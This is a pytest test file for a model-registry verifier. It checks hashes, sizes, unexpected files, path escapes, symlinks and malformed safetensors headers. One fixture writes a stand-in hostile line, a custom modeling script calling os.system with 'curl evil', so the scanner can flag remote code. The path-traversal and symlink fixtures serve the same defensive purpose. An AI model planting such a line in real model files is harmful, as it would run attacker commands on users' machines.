import hashlib
import json
import struct

import pytest

from punkai.errors import VerificationError
from punkai.registry.manifest import FileEntry, ModelManifest
from punkai.registry.verify import (
    inspect_safetensors,
    resolve_within,
    scan_directory,
    sha256_file,
    verify_directory,
)

REV = "c" * 40


def write(path, data: bytes):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return hashlib.sha256(data).hexdigest()


def safetensors_bytes(tensors=None, data_len=16, header_len_override=None):
    tensors = tensors if tensors is not None else {
        "weight": {"dtype": "F32", "shape": [2, 2], "data_offsets": [0, data_len]}
    }
    header = json.dumps(tensors).encode("utf-8")
    declared = header_len_override if header_len_override is not None else len(header)
    return struct.pack("<Q", declared) + header + b"\x00" * data_len


def test_hash_match_passes(tmp_path):
    digest = write(tmp_path / "model.safetensors", safetensors_bytes())
    size = (tmp_path / "model.safetensors").stat().st_size
    m = ModelManifest(
        name="m", source="local:", revision=REV, license="mit",
        files=[FileEntry("model.safetensors", digest, size)],
    )
    report = verify_directory(m, tmp_path)
    assert report.ok, report.summary()
    assert report.checked == ["model.safetensors"]


def test_modified_file_is_caught(tmp_path):
    """The whole point: weights that changed since you approved them."""
    path = tmp_path / "model.safetensors"
    digest = write(path, safetensors_bytes())
    m = ModelManifest(
        name="m", source="local:", revision=REV, license="mit",
        files=[FileEntry("model.safetensors", digest)],
    )
    path.write_bytes(safetensors_bytes(data_len=32))
    report = verify_directory(m, tmp_path)
    assert not report.ok
    assert any(f.code == "hash-mismatch" for f in report.errors)


def test_missing_file_is_an_error(tmp_path):
    m = ModelManifest(
        name="m", source="local:", revision=REV, license="mit",
        files=[FileEntry("absent.safetensors", "d" * 64)],
    )
    report = verify_directory(m, tmp_path)
    assert any(f.code == "missing-file" for f in report.errors)


def test_size_mismatch_is_caught(tmp_path):
    digest = write(tmp_path / "model.safetensors", safetensors_bytes())
    m = ModelManifest(
        name="m", source="local:", revision=REV, license="mit",
        files=[FileEntry("model.safetensors", digest, 999999)],
    )
    report = verify_directory(m, tmp_path)
    assert any(f.code == "size-mismatch" for f in report.errors)


def test_strict_mode_flags_unexpected_files(tmp_path):
    digest = write(tmp_path / "model.safetensors", safetensors_bytes())
    write(tmp_path / "surprise.py", b"import os")
    m = ModelManifest(
        name="m", source="local:", revision=REV, license="mit",
        files=[FileEntry("model.safetensors", digest)],
    )
    assert verify_directory(m, tmp_path, allow_extra=True).ok
    strict = verify_directory(m, tmp_path, allow_extra=False)
    assert not strict.ok
    assert any(f.code == "unexpected-file" for f in strict.errors)


def test_scan_flags_pickles_and_scripts(tmp_path):
    write(tmp_path / "pytorch_model.bin", b"\x80\x04garbage")
    write(tmp_path / "modeling_custom.py", b"import os; os.system('curl evil')")
    write(tmp_path / "run.sh", b"#!/bin/sh")
    codes = {f.code for f in scan_directory(tmp_path)}
    assert {"pickle-format", "remote-code", "executable"} <= codes


def test_scan_clean_dir_is_quiet(tmp_path):
    write(tmp_path / "model.safetensors", safetensors_bytes())
    write(tmp_path / "config.json", b"{}")
    assert scan_directory(tmp_path) == []


def test_resolve_within_blocks_escape(tmp_path):
    with pytest.raises(VerificationError, match="escapes"):
        resolve_within(tmp_path, "../outside.txt")


def test_symlink_outside_root_is_flagged(tmp_path):
    outside = tmp_path.parent / "secret.txt"
    outside.write_text("shh", encoding="utf-8")
    root = tmp_path / "model"
    root.mkdir()
    (root / "link.safetensors").symlink_to(outside)
    assert any(f.code == "symlink-outside-root" for f in scan_directory(root))


# --- safetensors header parsing -----------------------------------------


def test_valid_safetensors_header_parses(tmp_path):
    path = tmp_path / "m.safetensors"
    path.write_bytes(safetensors_bytes())
    header = inspect_safetensors(path)
    assert "weight" in header.tensors
    assert header.data_bytes == 16


def test_header_longer_than_file_rejected(tmp_path):
    """A lying length field must not become an out-of-bounds read."""
    path = tmp_path / "m.safetensors"
    path.write_bytes(safetensors_bytes(header_len_override=10**6))
    with pytest.raises(VerificationError, match="runs past end of file"):
        inspect_safetensors(path)


def test_absurd_header_length_rejected_without_allocating(tmp_path):
    path = tmp_path / "m.safetensors"
    path.write_bytes(struct.pack("<Q", 2**60) + b"{}")
    with pytest.raises(VerificationError, match="refusing to read"):
        inspect_safetensors(path)


def test_offsets_outside_data_region_rejected(tmp_path):
    path = tmp_path / "m.safetensors"
    path.write_bytes(
        safetensors_bytes({"w": {"dtype": "F32", "shape": [4], "data_offsets": [0, 10**9]}})
    )
    with pytest.raises(VerificationError, match="outside the"):
        inspect_safetensors(path)


def test_unknown_dtype_rejected(tmp_path):
    path = tmp_path / "m.safetensors"
    path.write_bytes(
        safetensors_bytes({"w": {"dtype": "EXEC", "shape": [1], "data_offsets": [0, 4]}})
    )
    with pytest.raises(VerificationError, match="unknown dtype"):
        inspect_safetensors(path)


def test_malformed_safetensors_surfaces_in_scan(tmp_path):
    (tmp_path / "bad.safetensors").write_bytes(struct.pack("<Q", 50) + b"not json at all!!")
    findings = scan_directory(tmp_path)
    assert any(f.code == "malformed-safetensors" and f.level == "error" for f in findings)


def test_sha256_file_matches_hashlib(tmp_path):
    path = tmp_path / "blob"
    data = b"punk" * 100_000
    path.write_bytes(data)
    assert sha256_file(path) == hashlib.sha256(data).hexdigest()
